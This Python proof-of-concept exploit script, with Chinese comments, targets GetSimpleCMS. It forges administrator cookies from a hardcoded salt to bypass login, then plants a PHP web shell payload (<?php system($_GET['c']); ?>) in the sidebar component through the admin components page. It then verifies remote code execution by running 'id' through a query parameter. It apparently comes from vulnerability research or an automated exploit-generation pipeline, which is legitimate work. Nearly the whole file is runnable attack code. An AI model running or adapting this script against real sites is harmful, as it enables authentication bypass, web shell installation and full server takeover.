
"""
GetSimpleCMS Components/Snippets 存储型PHP代码注入漏洞 PoC

漏洞ID: CVE-GS-COMPONENT-CODE-INJ-001
exploitIdeaId: E.0

漏洞描述：
GetSimpleCMS 的 Components/Snippets 功能存在 PHP 代码注入漏洞。
当组件被 get_component() 调用时，output_collection_item() 函数会使用 eval() 
执行组件值中的 PHP 代码，导致攻击者可以执行任意 PHP 代码。

利用步骤：
1. 绕过登录验证（通过伪造管理员 Cookie）
2. 访问 /admin/components.php 页面
3. 创建或修改组件，在 value 字段中注入恶意 PHP 代码
4. 保存组件
5. 当该组件被模板调用时（例如 sidebar 组件），恶意代码会被执行

注意事项：
- 由于组件值会经过 safe_slash_html() 函数进行 HTML 转义
- 但当组件被调用时，会经过 strip_decode() 函数反转义
- 最终会被 eval() 执行
- Payload 示例：<?php system($_GET["c"]); ?>
"""

import requests
import hashlib
import urllib.parse
import re

def exploit_getsimple_rce(target_url):
    """
    GetSimpleCMS RCE 漏洞利用
    
    Args:
        target_url: 目标 URL，例如 http://127.0.0.1:8080
    
    Returns:
        bool: 利用是否成功
    """
    
    # 1. 伪造管理员 Cookie
    # Cookie 计算方式：
    # - saltCOOKIEID = sha1($cookie_name . $SALT)
    # - saltUSR = sha1($USR . $SALT)
    # 其中 $cookie_name、$SALT、$USR 需要从配置文件中获取
    
    # 注意：这些值需要根据实际环境调整
    cookie_name = 'getsimple_cookie_340a'
    salt = '9dac1ebbb85b0c05dd49f0b60858e4af'
    usr = 'admin'
    
    saltCOOKIEID = hashlib.sha1((cookie_name + salt).encode()).hexdigest()
    saltUSR = hashlib.sha1((usr + salt).encode()).hexdigest()
    
    print(f"[*] Forging admin cookies...")
    print(f"    Cookie name: {saltCOOKIEID}")
    print(f"    Cookie value: {saltUSR}")
    
    # 创建会话并设置 Cookie
    session = requests.Session()
    session.cookies[saltCOOKIEID] = saltUSR
    session.cookies['GS_ADMIN_USERNAME'] = usr
    
    # 2. 访问 components.php 页面
    print(f"[*] Accessing components page...")
    components_response = session.get(f"{target_url}/admin/components.php")
    
    # 3. 提取 nonce（CSRF token）
    nonce_match = re.search(r'<input[^>]*name=["\']nonce["\'][^>]*value=["\']([^"\']+)["\']', components_response.text)
    if not nonce_match:
        print(f"[-] Failed to extract nonce")
        return False
    
    nonce = nonce_match.group(1)
    print(f"[+] Nonce extracted: {nonce}")
    
    # 4. 准备恶意 payload
    # Payload 会经过 safe_slash_html() 转义，所以需要使用 HTML 实体
    # 例如：<?php system($_GET["c"]); ?> 会被转义为 &lt;?php system($_GET[&quot;c&quot;]); ?&gt;
    payload = '<?php system($_GET["c"]); ?>'
    escaped_payload = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
    
    print(f"[*] Payload: {payload}")
    print(f"[*] Escaped payload: {escaped_payload}")
    
    # 5. 提交恶意组件
    component_data = {
        "component[0][id]": "sidebar",
        "component[0][slug]": "sidebar",
        "component[0][title]": "Sidebar",
        "component[0][val]": escaped_payload,
        "component[0][active]": "1",
        "nonce": nonce,
        "submitted": "Save Components"
    }
    
    print(f"[*] Submitting malicious component...")
    save_response = session.post(f"{target_url}/admin/components.php", data=component_data, allow_redirects=False)
    
    if save_response.status_code == 200 or save_response.status_code == 302:
        print(f"[+] Component saved successfully!")
    else:
        print(f"[-] Failed to save component")
        return False
    
    # 6. 验证 RCE
    print(f"[*] Verifying RCE...")
    test_command = "id"
    response = requests.get(f"{target_url}/?c={urllib.parse.quote(test_command)}")
    
    # 从响应中提取命令输出
    sidebar_match = re.search(r'<aside id="sidebar">(.*?)</aside>', response.text, re.DOTALL)
    if sidebar_match:
        sidebar_content = sidebar_match.group(1)
        # 清理 HTML 标签
        output = re.sub(r'<[^>]+>', '\n', sidebar_content)
        output = '\n'.join(line.strip() for line in output.split('\n') if line.strip())
        
        if "uid=" in output and "gid=" in output:
            print(f"[+] RCE vulnerability verified!")
            print(f"[+] Command output: {output}")
            return True
    
    print(f"[-] Failed to verify RCE")
    return False

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python exploit.py <target_url>")
        print("Example: python exploit.py http://127.0.0.1:8080")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    print("=" * 80)
    print("GetSimpleCMS Components/Snippets 存储型PHP代码注入漏洞 PoC")
    print("exploitIdeaId: E.0")
    print("=" * 80)
    print()
    
    if exploit_getsimple_rce(target_url):
        print()
        print("=" * 80)
        print("[+] Exploit successful!")
        print("[+] Attackers can execute arbitrary PHP code on the server")
        print("=" * 80)
    else:
        print()
        print("=" * 80)
        print("[-] Exploit failed")
        print("=" * 80)
